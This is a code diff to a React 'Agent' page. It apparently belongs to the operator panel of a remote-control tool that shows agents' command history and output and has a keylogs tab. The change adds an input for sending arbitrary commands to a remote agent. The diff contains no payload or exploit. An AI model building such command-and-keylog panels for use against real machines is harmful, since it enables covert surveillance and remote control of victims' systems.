@@ -1,4 +1,4 @@
-import React, { useEffect, useState, useContext } from 'react';
+import React, { useEffect, useState, useContext, useRef } from 'react';
 import axios from '../../api/axios';
 import AuthContext from '../../context/AuthProvider';
 import { useLocation } from 'react-router-dom';
@@ -9,7 +9,9 @@ const Agent = () => {
   const [data, setData] = useState(null);
   const [commands, setCommands] = useState([]);
   const [activeTab, setActiveTab] = useState('commands');
+  const [newCommand, setNewCommand] = useState('');
   const [error, setError] = useState(null);
+  const commandListRef = useRef(null);
 
   const location = useLocation();
 
@@ -30,7 +32,7 @@ const Agent = () => {
       } else {
         setError('No data found');
       }
-      
+
       if (commandsResponse.data.data) {
         setCommands(commandsResponse.data.data);
       } else {
@@ -38,6 +40,23 @@ const Agent = () => {
       }
     } catch (err) {
       setError(err.message);
+    }
+  };
+
+  const handleSendCommand = async () => {
+    try {
+      const queryParam = getQueryParam('agt');
+      if (newCommand.trim() === '') {
+        setError('Command cannot be empty');
+        return;
+      }
+
+      const commandBody = { command: newCommand };
+      await axios.post(`/api/command/${queryParam}`, commandBody);
+      setNewCommand('');
+      fetchData();
+    } catch (err) {
+      setError('Failed to send command');
     }
   };
 
@@ -50,6 +69,12 @@ const Agent = () => {
     return () => clearInterval(interval);
   }, [location.search]);
 
+  useEffect(() => {
+    if (commandListRef.current) {
+      commandListRef.current.scrollTop = commandListRef.current.scrollHeight;
+    }
+  }, [commands]);
+
   if (error) {
     return <div>Error: {error}</div>;
   }
@@ -59,7 +84,7 @@ const Agent = () => {
   }
 
   const renderCommandsTab = () => (
-    <div className="commands-list">
+    <div className="commands-list" ref={commandListRef}>
       <h3>Commands</h3>
       {commands.length === 0 ? (
         <p>No commands available.</p>
@@ -68,14 +93,22 @@ const Agent = () => {
           {commands.map((cmd) => (
             <li key={cmd.commanduuid}>
               <strong>Command:</strong> {cmd.command} <br />
-              <strong>Output:</strong> {cmd.output !== "" ? cmd.output : "(No output)"} <br /> {}
+              <strong>Output:</strong> {cmd.output !== '' ? cmd.output : '(No output)'} <br />
             </li>
           ))}
         </ul>
       )}
+      <div className="command-input">
+        <input
+          type="text"
+          placeholder="Enter command"
+          value={newCommand}
+          onChange={(e) => setNewCommand(e.target.value)}
+        />
+        <button onClick={handleSendCommand}>Send</button>
+      </div>
     </div>
   );
-  
 
   const renderKeylogsTab = () => (
     <div>
@@ -108,7 +141,7 @@ const Agent = () => {
             className={activeTab === 'commands' ? 'active' : ''}
             onClick={() => setActiveTab('commands')}
           >
-            Command History
+            Commands
           </button>
           <button
             className={activeTab === 'keys' ? 'active' : ''}
